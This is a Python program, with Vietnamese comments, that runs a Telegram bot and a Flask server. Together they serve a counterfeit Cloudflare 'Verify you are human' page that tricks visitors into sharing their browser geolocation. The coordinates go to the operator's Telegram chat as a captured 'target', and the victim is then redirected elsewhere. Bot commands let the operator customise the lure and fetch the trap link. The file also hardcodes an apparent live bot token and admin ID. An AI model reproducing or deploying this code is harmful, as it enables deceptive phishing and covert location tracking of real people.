import telebot
from flask import Flask, request, render_template_string
import os
from threading import Thread

TOKEN = '8222981632:AAGeWH4l1Mvmvaod8z5lVhthkyHXLtRvgOU'
ADMIN_ID = "6681014168"
bot = telebot.TeleBot(TOKEN)
app = Flask('')

# Lưu trạng thái nhập liệu
user_state = {}
trap_data = {
    "title": "Cloudflare Security Check",
    "desc": "Please wait while we verify your connection...",
    "img": "https://www.cloudflare.com/img/logo-cloudflare-dark.png",
    "redirect": "https://facebook.com"
}

# --- GIAO DIỆN GIẢ MẠO CLOUDFLARE ---
CLOUDFLARE_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <meta property="og:title" content="{{ title }}">
    <meta property="og:description" content="{{ desc }}">
    <meta property="og:image" content="{{ img }}">
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; color: #313131; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { max-width: 400px; padding: 20px; text-align: center; }
        .cf-logo { width: 120px; margin-bottom: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f68b1f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #0051ad; color: white; border: none; padding: 12px 25px; border-radius: 5px; font-size: 15px; cursor: pointer; }
    </style>
    <script>
        function verify() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(s => {
                    fetch(`/log?lat=${s.coords.latitude}&lon=${s.coords.longitude}`);
                    setTimeout(() => { window.location.href = "{{ redirect }}"; }, 1500);
                }, () => { window.location.href = "{{ redirect }}"; });
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.png" class="cf-logo">
        <h1>{{ title }}</h1>
        <p>{{ desc }}</p>
        <div class="spinner"></div>
        <button class="btn" onclick="verify()">Verify you are human</button>
    </div>
</body>
</html>
"""

@app.route('/verify-connection')
def verify_page():
    return render_template_string(CLOUDFLARE_HTML, **trap_data)

@app.route('/log')
def log():
    lat, lon = request.args.get('lat'), request.args.get('lon')
    bot.send_message(ADMIN_ID, f"🎯 **MỤC TIÊU SẬP BẪY!**\n📍 Tọa độ: `{lat}, {lon}`\n🗺 [Xem bản đồ](http://google.com/maps?q={lat},{lon})")
    return "200"

# --- TÍNH NĂNG CÀI ĐẶT MENU LỆNH ---
@bot.message_handler(commands=['setmenu'])
def set_menu(message):
    commands = [
        telebot.types.BotCommand("start", "Khởi động Bot"),
        telebot.types.BotCommand("create", "Tạo bẫy Cloudflare mới"),
        telebot.types.BotCommand("getlink", "Lấy link bẫy hiện tại")
    ]
    bot.set_my_commands(commands)
    bot.reply_to(message, "✅ Đã cài đặt Menu lệnh thành công! Sếp nhìn góc trái dưới chỗ nhập tin nhắn sẽ thấy nút Menu.")

# --- QUY TRÌNH HỎI TỪNG BƯỚC ---
@bot.message_handler(commands=['create'])
def start_create(message):
    user_state[message.chat.id] = "step1"
    bot.reply_to(message, "🎯 **Bước 1:** Nhập TIÊU ĐỀ (Ví dụ: Cloudflare Security)")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id) == "step1")
def step1(message):
    trap_data["title"] = message.text
    user_state[message.chat.id] = "step2"
    bot.reply_to(message, "📝 **Bước 2:** Nhập MÔ TẢ (Ví dụ: Vui lòng xác minh để tiếp tục)")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id) == "step2")
def step2(message):
    trap_data["desc"] = message.text
    user_state[message.chat.id] = "step3"
    bot.reply_to(message, "🖼 **Bước 3:** Gửi LINK ẢNH (Dùng link ảnh logo sếp muốn)")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id) == "step3")
def step3(message):
    trap_data["img"] = message.text
    user_state[message.chat.id] = "step4"
    bot.reply_to(message, "🔗 **Bước 4:** Gửi LINK FB hoặc WEB (Nơi họ sẽ bị đẩy sang sau khi bị hack)")

@bot.message_handler(func=lambda m: user_state.get(m.chat.id) == "step4")
def step4(message):
    trap_data["redirect"] = message.text
    user_state[message.chat.id] = None
    link = "https://my-bot-24h.onrender.com/verify-connection"
    bot.reply_to(message, f"🔥 **XONG!** Link bẫy Cloudflare của sếp:\n`{link}`")

@bot.message_handler(commands=['getlink'])
def getlink(message):
    bot.reply_to(message, f"🔗 Link bẫy hiện tại:\n`https://my-bot-24h.onrender.com/verify-connection`")

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

if __name__ == "__main__":
    Thread(target=run).start()
    bot.infinity_polling(skip_pending=True)
